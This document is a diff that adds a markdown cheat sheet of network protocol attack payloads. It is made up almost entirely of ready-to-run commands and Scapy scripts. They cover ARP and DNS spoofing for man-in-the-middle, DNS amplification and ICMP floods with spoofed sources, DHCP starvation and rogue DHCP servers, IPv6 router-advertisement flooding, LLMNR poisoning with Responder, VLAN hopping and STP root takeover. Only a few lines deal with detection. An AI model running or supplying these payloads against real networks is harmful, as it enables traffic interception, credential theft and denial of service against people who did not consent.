@@ -1,0 +1,256 @@
+# Protocol Attack Payloads
+
+## ARP Spoofing / Poisoning
+
+### ARPSpoof (dsniff)
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1                          # Spoof victim to gateway
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.100                          # Spoof gateway to victim
+arpspoof -i eth0 -r 192.168.1.100 192.168.1.1                          # Bidirectional spoofing
+
+### Ettercap
+ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/       # ARP poisoning MITM
+ettercap -T -q -i eth0 -M arp /192.168.1.100// ///                    # Poison single target
+ettercap -G                                                            # GUI mode
+ettercap -T -i eth0 -M arp /// ///                                     # Poison entire network
+ettercap -T -i eth0 -M arp -P autoadd /192.168.1.0/24//               # Auto-add targets
+
+### Bettercap
+bettercap -iface eth0                                                  # Start interactive
+bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"
+bettercap -iface eth0 -eval "set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"
+# Inside bettercap console:
+# net.probe on
+# set arp.spoof.targets 192.168.1.100
+# arp.spoof on
+# net.sniff on
+
+### Scapy ARP Spoofing
+python3 << 'EOF'
+from scapy.all import *
+import time
+
+target_ip = "192.168.1.100"
+gateway_ip = "192.168.1.1"
+
+# Get MAC addresses
+target_mac = getmacbyip(target_ip)
+gateway_mac = getmacbyip(gateway_ip)
+
+# Create ARP packets
+arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+
+# Send packets continuously
+while True:
+    send(arp_target, verbose=False)
+    send(arp_gateway, verbose=False)
+    time.sleep(2)
+EOF
+
+### ARP Scan and Detection
+arp-scan -l                                                            # Scan local network
+arp-scan -I eth0 192.168.1.0/24                                        # Scan specific subnet
+nmap -sn -PR 192.168.1.0/24                                            # ARP discovery
+netdiscover -r 192.168.1.0/24                                          # Passive ARP discovery
+
+### ARP Cache Inspection
+arp -a                                                                 # View ARP cache
+arp -n                                                                 # Numeric addresses
+ip neigh                                                               # Linux neighbor table
+arp -d 192.168.1.100                                                   # Delete entry
+
+## DNS Attacks
+
+### DNS Spoofing with dnsspoof
+dnsspoof -i eth0                                                       # Spoof all DNS
+dnsspoof -i eth0 -f hosts.txt                                          # Custom hosts file
+dnsspoof -i eth0 host target.com                                       # Spoof specific domain
+
+### DNS Spoofing with Ettercap
+# Create dns_spoof file: /etc/ettercap/etter.dns
+# Add: target.com A 192.168.1.50
+ettercap -T -q -i eth0 -P dns_spoof -M arp /// ///
+
+### DNS Cache Poisoning with Scapy
+python3 << 'EOF'
+from scapy.all import *
+
+# Intercept DNS query and respond with fake answer
+def dns_spoof(pkt):
+    if pkt.haslayer(DNSQR):
+        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.1.50"))
+        send(spoofed_pkt, verbose=0)
+
+sniff(filter="udp port 53", prn=dns_spoof)
+EOF
+
+### DNS Tunneling
+iodine -f 192.168.1.100 tunnel.target.com                              # DNS tunnel client
+iodined -f 10.0.0.1 tunnel.target.com                                  # DNS tunnel server
+dnscat2-server tunnel.target.com                                       # Dnscat2 server
+dnscat2 tunnel.target.com                                              # Dnscat2 client
+
+### DNS Amplification Attack
+# Using hping3
+hping3 -2 -p 53 --flood --rand-source -d 120 192.168.1.100
+
+# Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+target = "192.168.1.100"
+dns_servers = ["8.8.8.8", "1.1.1.1"]
+for dns in dns_servers:
+    send(IP(dst=dns, src=target)/UDP()/DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY")), count=100)
+EOF
+
+### DNS Enumeration
+fierce --domain target.com                                             # Fierce DNS scanner
+dnsrecon -d target.com -t std                                          # Standard enumeration
+dnsrecon -d target.com -t axfr                                         # Zone transfer
+dnsrecon -d target.com -t brt -D subdomains.txt                        # Brute force
+dnsenum target.com                                                     # DNS enumeration
+nmap -p 53 --script=dns-zone-transfer target.com                       # Zone transfer
+nmap -p 53 --script=dns-brute target.com                               # DNS brute
+
+## DHCP Attacks
+
+### DHCP Starvation
+yersinia -G                                                            # GUI mode
+yersinia -I                                                            # Interactive mode
+# In interactive mode: press 'g' for DHCP, select starvation attack
+
+# Using dhcpstarv
+dhcpstarv -i eth0                                                      # Exhaust DHCP pool
+
+# Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+import random
+
+def random_mac():
+    return ":".join(["{:02x}".format(random.randint(0, 255)) for _ in range(6)])
+
+for i in range(100):
+    mac = random_mac()
+    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
+                    IP(src="0.0.0.0", dst="255.255.255.255") / \
+                    UDP(sport=68, dport=67) / \
+                    BOOTP(chaddr=mac) / \
+                    DHCP(options=[("message-type", "discover"), "end"])
+    sendp(dhcp_discover, iface="eth0", verbose=False)
+EOF
+
+### Rogue DHCP Server
+# Using dnsmasq
+dnsmasq --interface=eth0 --dhcp-range=192.168.1.50,192.168.1.150,12h --dhcp-option=3,192.168.1.50
+
+# Using dhcpd
+# Edit /etc/dhcp/dhcpd.conf
+dhcpd -f -d eth0                                                       # Start rogue DHCP
+
+### DHCP Snooping Detection
+nmap -sU -p 67 --script=dhcp-discover 192.168.1.0/24                   # Discover DHCP servers
+dhcpdump -i eth0                                                       # Monitor DHCP traffic
+tcpdump -i eth0 -n port 67 or port 68                                  # Capture DHCP
+
+## ICMP Attacks
+
+### ICMP Flood
+hping3 -1 --flood 192.168.1.100                                        # ICMP flood
+ping -f 192.168.1.100                                                  # Ping flood (root)
+ping -s 65507 192.168.1.100                                            # Large ICMP packets
+
+### Ping of Death
+ping -s 65500 192.168.1.100                                            # Oversized ping
+hping3 -1 -d 65495 192.168.1.100                                       # Hping3 version
+
+### ICMP Redirect
+hping3 -C 5 -K 1 -a 192.168.1.1 --icmp-gw 192.168.1.50 192.168.1.100  # ICMP redirect
+
+### Smurf Attack
+hping3 -1 --flood -a 192.168.1.100 192.168.1.255                       # Broadcast ping spoof
+nmap -sn -PE --source-ip 192.168.1.100 192.168.1.255                   # Smurf with nmap
+
+## IPv6 Attacks
+
+### IPv6 Router Advertisement Flooding
+atk6-flood_router6 eth0                                                # RA flood
+atk6-flood_advertise6 eth0                                             # Advertisement flood
+atk6-fake_router6 eth0 fe80::1 2001:db8::/64                           # Fake router
+
+### IPv6 Neighbor Discovery
+atk6-alive6 eth0                                                       # Discover IPv6 hosts
+atk6-detect-new-ip6 eth0                                               # Detect new IPv6
+nmap -6 fe80::1%eth0                                                   # IPv6 scan
+
+### IPv6 MITM
+atk6-parasite6 eth0 fe80::1                                            # IPv6 MITM
+atk6-ndpexhaust6 eth0                                                  # NDP exhaustion
+
+### IPv6 DHCPv6 Attacks
+atk6-dhcpv6-dos eth0                                                   # DHCPv6 DoS
+atk6-dos-new-ip6 eth0                                                  # New IP DoS
+
+## LLMNR/NBT-NS Poisoning
+
+### Responder
+responder -I eth0                                                      # Start responder
+responder -I eth0 -w                                                   # WPAD attack
+responder -I eth0 -wrfFb                                               # All options
+responder -I eth0 -A                                                   # Analyze mode only
+
+### Inveigh (PowerShell - Windows)
+# Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y
+
+### LLMNR/NBT-NS with Metasploit
+msfconsole -q -x "use auxiliary/spoof/llmnr/llmnr_response; set INTERFACE eth0; run"
+msfconsole -q -x "use auxiliary/spoof/nbns/nbns_response; set INTERFACE eth0; run"
+
+## VLAN Hopping
+
+### Switch Spoofing (DTP)
+yersinia -I                                                            # Interactive mode (VLAN)
+# Press 'g' for 802.1q, select DTP attack
+
+# Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+packet = Ether(dst="01:00:0c:cc:cc:cc")/Dot3()/LLC()/SNAP()/DTP()
+sendp(packet, iface="eth0", loop=1)
+EOF
+
+### Double Tagging Attack
+# Create double-tagged frame with Scapy
+python3 << 'EOF'
+from scapy.all import *
+packet = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="192.168.20.100")/ICMP()
+sendp(packet, iface="eth0")
+EOF
+
+### Frogger VLAN Hopper
+# Python tool for VLAN hopping
+# frogger.py -i eth0 -t 10,20,30
+
+## STP Attacks
+
+### STP Root Bridge Takeover
+yersinia -I                                                            # Interactive mode
+# Press 'g' for STP, select claiming root role
+
+### STP DoS
+yersinia stp -attack 0 -interface eth0                                 # STP attack mode
+
+## CDP/LLDP Reconnaissance
+
+### CDP Sniffing
+yersinia -I                                                            # Press 'g' for CDP
+tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'           # Capture CDP
+tshark -i eth0 -Y "cdp"                                                # Wireshark CDP filter
+
+### LLDP Sniffing
+tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether proto 0x88cc'              # Capture LLDP
+tshark -i eth0 -Y "lldp"                                               # Wireshark LLDP filter
+lldpd -d                                                               # LLDP daemon debug
